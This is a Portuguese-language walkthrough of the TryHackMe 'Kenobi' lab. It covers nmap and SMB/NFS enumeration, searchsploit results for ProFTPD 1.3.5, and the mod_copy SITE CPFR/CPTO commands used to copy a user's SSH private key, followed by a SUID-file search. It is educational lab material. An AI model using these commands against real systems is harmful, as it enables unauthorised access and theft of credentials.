Refazendo essa sala do zero e anotando os comandos, pois ainda não a finalizei.

# Tarefa 1

Primeiramente, comecei realizando um escaneamento nessa máquina com o nmap para saber quais portas e quantas delas estão abertas.

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-02 18:41 -03
Nmap scan report for 10.10.89.35
Host is up (0.28s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/2%OT=21%CT=1%CU=32923%PV=Y%DS=2%DC=I%G=Y%TM=61FAFAAF
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%II=I%TS=8)SEQ(SP=10
OS:4%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3
OS:=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=68DF%W2=6
OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW
OS:6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.13 seconds
```

Descobri assim que o número de portas abertas é 7

# Segunda tarefa

![[Pasted image 20220202184622.png]]

Seguindo a explicação dada pelo tryhackme, eu utilizei o comando que eles disponibilizaram para enumerar os equipamentos que estão sendo compartilhados com a máquina.

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.89.35
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-02 18:47 -03
Nmap scan report for 10.10.89.35
Host is up (0.29s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.89.35\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.89.35\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.89.35\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 45.01 seconds
```

Vi acima que haviam 3 ips que estavam sendo conectados com a máquina, que é a primeira resposta do desafio.

![[Pasted image 20220202185112.png]]

Utilizei o comando que o exercício pedia:

```
mbclient //10.10.89.35/anonymous
```

```
smb: \> ls
  .                                   D        0  Wed Sep  4 07:49:09 2019
  ..                                  D        0  Wed Sep  4 07:56:07 2019
  log.txt                             N    12237  Wed Sep  4 07:49:09 2019

                9204224 blocks of size 1024. 6877112 blocks available

```

Vi que havia um arquivo log.txt. Por isso, usei o comando smbget para copiar esse arquivo na minha máquina.

![[Pasted image 20220202190007.png]]

```
smbget -R smb://10.10.89.35/anonymous
```

Ao copiar o arquivo, eu o abri para ver o que havia nele e encontrei a resposta para a porta FTP

![[Pasted image 20220202190252.png]]

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.89.35
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-02 19:03 -03
Nmap scan report for 10.10.89.35
Host is up (0.26s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836524.0  6877104.0  22%   16.0T        32000
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 4.57 seconds
```

Assim, descobri que a resposta seria /var

![[Pasted image 20220202190620.png]]

Agora o exercício pede que usemos o netcat para realizar os primeiros exercícios

Comecei rodando o comando:

```
nc 10.10.89.35 21 
```

Isto me respondeu com a seguinte saída:

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.89.35]
```

Ao visualizar a versão, o exercício me pediu para ver quantos exploits existiam para o ProFTPD na versão 1.3.5. Para realizar tal ação, utilizei o comando:

```
searchsploit ProFTPD 1.3.5
```

E isso me retornou a seguinte saída:

```
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)               | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                     | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                 | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                               | linux/remote/36742.txt
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

Que dá um total de 4 exploits.

![[Pasted image 20220202191507.png]]
explicação do exploits [aqui](http://www.proftpd.org/docs/contrib/mod_copy.html)

Em seguida, o exercício me pediu para copiar a chave privada com o seguinte comando:

```
SITE CPFR /home/kenobi/.ssh/id_rsa
```

```
SITE CPTO /var/tmp/id_rsa
```

![[Pasted image 20220202192501.png]]

Depois disso, eu copiei o arquivo id_rsa e rodei o seguinte comando:

```
sudo chmod 600 id_rsa
```

e depois acessei o servidor ssh

```
ssh -i id_rsa kenobi@10.10.239.150
```

Após isso, abri o arquivo texto dele e lá estava a flag.

# Quarta etapa

![[Pasted image 20220202193433.png]]

To search the a system for these type of files run the following: 

```
find / -perm -u=s -type f 2>/dev/null
```

Após isso, notei um arquivo estranho cujo o nome é /usr/bin/menu e usando o comando:

```
/usr/bin/menu
```

Eu executei o programa mostrando um menu com 3 opções.

![[Pasted image 20220202201419.png]]

Apenas segui as instruções do site e cheguei na flag